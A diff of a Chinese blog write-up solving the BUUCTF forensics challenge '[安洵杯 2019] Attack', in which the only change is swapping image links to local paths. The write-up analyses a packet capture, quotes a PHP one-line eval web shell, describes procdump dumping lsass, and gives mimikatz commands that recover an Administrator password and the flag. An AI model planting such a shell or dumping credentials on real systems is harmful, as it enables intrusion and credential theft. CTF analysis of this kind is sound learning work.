@@ -13,7 +13,7 @@ tags:
 - "BUUCTF"
 ---
 
-![文章题图：蓝发动漫少女，配文「刷题嘛~？一起呀」](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192325019.png)
+![文章题图：蓝发动漫少女，配文「刷题嘛~？一起呀」](/images/blog/20251228192325019.png)
 
 **BUUCTF: [https://buuoj.cn/challenges](https://buuoj.cn/challenges)** 
 
@@ -28,7 +28,7 @@ tags:
 - [［安洵杯 2019］Attack （详细解析）](https://blog.csdn.net/weixin_66146598/article/details/125129282)
 
 
- ![BUUCTF 题目「［安洵杯 2019］Attack 1」页面，附件为 attachment.zip](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192327104.png)
+ ![BUUCTF 题目「［安洵杯 2019］Attack 1」页面，附件为 attachment.zip](/images/blog/20251228192327104.png)
 
 ### 题目描述：
 
@@ -38,7 +38,7 @@ tags:
 
 下载附件解压，得到Attack.pcap文件
 
- ![解压得到的 Attack.pcap 与 attachment (1).zip](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192329001.png)
+ ![解压得到的 Attack.pcap 与 attachment (1).zip](/images/blog/20251228192329001.png)
 
 ---
 
@@ -48,52 +48,52 @@ tags:
 
 **目录扫描** 
 
- ![Wireshark 包列表：出现 /admin/admin.php、update.php、/wp-admin/install.php 等扫描请求](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192330113.png)
+ ![Wireshark 包列表：出现 /admin/admin.php、update.php、/wp-admin/install.php 等扫描请求](/images/blog/20251228192330113.png)
 
 **上传一句话木马** 
 
- ![过滤 tcp.stream eq 819，可见 POST /upload.php 请求](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192332602.png)
+ ![过滤 tcp.stream eq 819，可见 POST /upload.php 请求](/images/blog/20251228192332602.png)
 
- ![追踪该 TCP 流：上传 config.php，内容为一句话木马 <?php @eval($_POST［'hack'］);?>](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192334567.png)
+ ![追踪该 TCP 流：上传 config.php，内容为一句话木马 <?php @eval($_POST［'hack'］);?>](/images/blog/20251228192334567.png)
 
 往下分析，发现一组TCP流量疑似执行命令，请求流量经过base64混淆，返回流量使用ROT13加密
 
- ![请求流是一长串 Base64 混淆的命令](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192337801.png)
+ ![请求流是一长串 Base64 混淆的命令](/images/blog/20251228192337801.png)
 
 继续分析其他TCP流，发现目录下多出一个s3cret.zip文件。(据说，可以通过文件大小异常，推测文件中包含其他文件，使用foremost分离文件)
 
- ![返回流为 ROT13 加密内容，红框里可见 s3cret.zip 等文件名](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192339966.png)
+ ![返回流为 ROT13 加密内容，红框里可见 s3cret.zip 等文件名](/images/blog/20251228192339966.png)
 
- ![CyberChef ROT13 解码后显示 C:\phpstudy_pro\WWW 目录，其中 s3cret.zip 被红框标出](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192341804.png)
+ ![CyberChef ROT13 解码后显示 C:\phpstudy_pro\WWW 目录，其中 s3cret.zip 被红框标出](/images/blog/20251228192341804.png)
 
 在下一组流量中，找到zip压缩包的“PK”文件头，以及一个flag.txt文件
 
- ![响应流中出现 PK 文件头与 flag.txt 字样（红框）](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192343482.png)
+ ![响应流中出现 PK 文件头与 flag.txt 字样（红框）](/images/blog/20251228192343482.png)
 
 2、将以“50 4B 03 04”开头的zip文件数据，拿出来保存为zip文件
 
- ![十六进制视图：50 4B 03 04 高亮，右侧可见 flag.txt](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192345626.png)
+ ![十六进制视图：50 4B 03 04 高亮，右侧可见 flag.txt](/images/blog/20251228192345626.png)
 
- ![原始数据视图：同样能看到 50 4B 03 04 与 flag.txt](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192348223.png)
+ ![原始数据视图：同样能看到 50 4B 03 04 与 flag.txt](/images/blog/20251228192348223.png)
 
 尝试解压，发现需要密码。根据压缩包hint提示，密码可能与administrator用户有关
 
- ![1.zip 内是 flag.txt，压缩包注释提示「这可是administrator的秘密，怎么能随便给人看呢？」](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192350434.png)
+ ![1.zip 内是 flag.txt，压缩包注释提示「这可是administrator的秘密，怎么能随便给人看呢？」](/images/blog/20251228192350434.png)
 
 继续分析流量，发现使用了procdump.exe这个工具，产生lsass.dmp文件
 
 > Procdump工具一般用来抓取windows的lsass进程中的用户明文密码
 > lsass是windows系统的一个进程，用于本地安全和登陆策略。
 
- ![CyberChef ROT13：ProcDump 的命令行输出，dump 出 lsass.dmp](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192352711.png)
+ ![CyberChef ROT13：ProcDump 的命令行输出，dump 出 lsass.dmp](/images/blog/20251228192352711.png)
 
 接下来，攻击者下载了lsass.dmp文件
 
- ![过滤 tcp.stream eq 833，可见 GET /uploads/lsass.dmp 请求](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192354293.png)
+ ![过滤 tcp.stream eq 833，可见 GET /uploads/lsass.dmp 请求](/images/blog/20251228192354293.png)
 
 我们将lsass.dmp文件下载下来
 
- ![Wireshark 导出 HTTP 对象，lsass.dmp 大小为 34 MB](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192356375.png)
+ ![Wireshark 导出 HTTP 对象，lsass.dmp 大小为 34 MB](/images/blog/20251228192356375.png)
 
 > Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！
 
@@ -107,11 +107,11 @@ sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords full
 ```
 
- ![mimikatz 读取 lsass.dmp，得到 Administrator 密码 W3lc0meToD0g3（红框）](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192358227.png)
+ ![mimikatz 读取 lsass.dmp，得到 Administrator 密码 W3lc0meToD0g3（红框）](/images/blog/20251228192358227.png)
 
 3、使用密码解压压缩包，得到flag.txt文件。（flag在文件底部，向下翻翻）
 
- ![flag.txt 内容：D0g3{3466b11de8894198af3636c5bd1efce2}](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251228192400016.png)
+ ![flag.txt 内容：D0g3{3466b11de8894198af3636c5bd1efce2}](/images/blog/20251228192400016.png)
 
 ### flag：
 
